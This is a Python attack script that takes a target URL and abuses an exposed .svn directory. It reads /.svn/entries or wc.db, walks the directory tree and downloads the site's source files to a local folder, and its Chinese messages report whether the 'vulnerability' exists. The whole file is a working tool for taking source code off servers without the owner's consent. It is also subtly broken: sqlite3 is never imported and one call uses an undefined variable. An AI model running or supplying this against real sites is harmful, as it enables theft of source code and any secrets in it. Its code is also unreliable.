#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import socket
import time
import json
import re
import os
import urllib
from urllib.request import urlretrieve
import random

urllib3.disable_warnings()


def mkdirSitesDir(path):
    if not os.path.exists(path):
        os.mkdir(path)

def mkdirPath(site):
    mkdirSitesDir("code/")
    
    product_dir = "code/" + site.split("/")[2].split(":")[0] + "/"
    mkdirSitesDir(product_dir)

    return product_dir

def checkSvnVersion(entriesUrl):
    try:
        response = requests.get(url = entriesUrl, verify = False, allow_redirects = False, timeout = 10)
        assert [200, 403].count(response.status_code) > 0
        print('[+] /.svn/entries exists -> len: {}'.format(response.headers['content-length']))
        return (1.7, 1.6)[int(response.headers['content-length']) > 20]
    except:
        print('[-] Check svn/entries Error') 
        sys.exit()

def checkSvnWcdb(wcdbUrl):
    try:
        response = requests.head(url = wcdbUrl, verify = False, allow_redirects = False, timeout = 10)
        (print('[-] wc.db not exists'), print('[+] wc.db exists'))[[200, 403].count(response.status_code) > 0]
    except:
        sys.exit()

def getSvnEntries(url, dirName = None):
    dirList = []
    fileList = []
    try:
        response = requests.get(url = url, verify = False, allow_redirects = False, timeout = 5)
        assert [200, 403].count(response.status_code) > 0
        entries = response.text.splitlines()
            
        for i, line in enumerate(entries):
            if line == 'dir' and entries[i-1]:
                dirList.append(((dirName + '/') if dirName else '') + entries[i-1])
            elif line == 'file' and entries[i-1]:
                fileList.append(((dirName + '/') if dirName else '') + entries[i-1])
    except:
        print('[-] Get svn/entries Error -> {}'.format(url))
    return dirList, fileList

def downloadWcdb(wcdbUrl, wcdbPath):
    try:
        if not os.path.exists(wcdbPath):
            print('[+] Downloading wc.db')
            urlretrieve(wcdbUrl, wcdbPath)
            print('[+] Downloaded') 
    except:
        print("Download 'wc.db' Failed")

def fetchWcdb(wcdbUrl, wcdbPath):
    if not os.path.exists(wcdbPath):
        downloadWcdb(wcdbUrl, wcdbPath)
    conn = sqlite3.connect(wcdbPath)
    cur = conn.cursor()
    sqlcmd = "SELECT local_relpath, checksum FROM NODES where checksum <> ''"
    rows = cur.execute(sqlcmd)
    for urlPath, checksum in rows:
        yield urlPath, checksum 
    conn.close()


#获取目录树
def getTreePath(entriesUrl, product_dir):
    allFilelist = []
    basepath = entriesUrl.replace("/.svn/entries", "")
    dirname = "/".join(basepath.split("/")[3:])
    dirlist, filelist =  getSvnEntries(entriesUrl, dirname)
    allFilelist.extend(filelist)
    if len(dirlist) == 0:
        return filelist
    allFilelist.extend(filelist)
    for dirpath in dirlist:
        mkdirSitesDir(product_dir+"/"+dirpath)
        entriesUrl = basepath + "/" + dirpath + "/.svn/entries"
        filelist = getTreePath(entriesUrl, product_dir)
        allFilelist.extend(filelist)
 
    return allFilelist
    

def verify(site):
    product_dir = mkdirPath(site)
    entriesUrl = site + "/.svn/entries"
    wcdbUrl = site + "/.svn/wc.db"
    wcdbSavePath = product_dir + "/wc.db"
    svnSiteDirName = product_dir + "/"
    
    if checkSvnVersion(entriesUrl) == 1.6:
        fileList = getTreePath(entriesUrl, product_dir)
        print(fileList)

        for fileName in fileList:
            try:
                fileUrl = urllib.parse.urljoin(site, '{}/.svn/text-base/{}.svn-base'.format(os.path.dirname(fileName),os.path.basename(fileName)))
                urlretrieve(fileUrl, product_dir+"/"+fileName)
            except:
                print(sys.exc_info())
                pass
        return product_dir

    checkSvnWcdb(wcdbUrl)

    for path, checksum in fetchWcdb(wcdbUrl, wcdbPath):
        mkdirSitesDir(os.path.join(svnSiteDirName, os.path.split(path)[0]))
        pristineSubdir = checksum[6:8]
        pristineFileName = checksum[6:]
        filePath = "pristine/" + pristineSubdir + "/" + pristineFileName + ".svn-base"
        try:
            if os.path.exists(os.path.join(svnSiteDirName, path)):
                continue
            print('[+] Download -> {}'.format(urllib.parse.urljoin(site, filePath)))
            urlretrieve(urllib.parse.urljoin(site, filePath), os.path.join(svnSiteDirName, path))
            print('[+] Downloaded')
        except KeyboardInterrupt:
            sys.exit(1)
        except:
            pass
    return product_dir


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，已经将源码下载到本地目录：", info)
    else:
        print("[-]漏洞不存在")
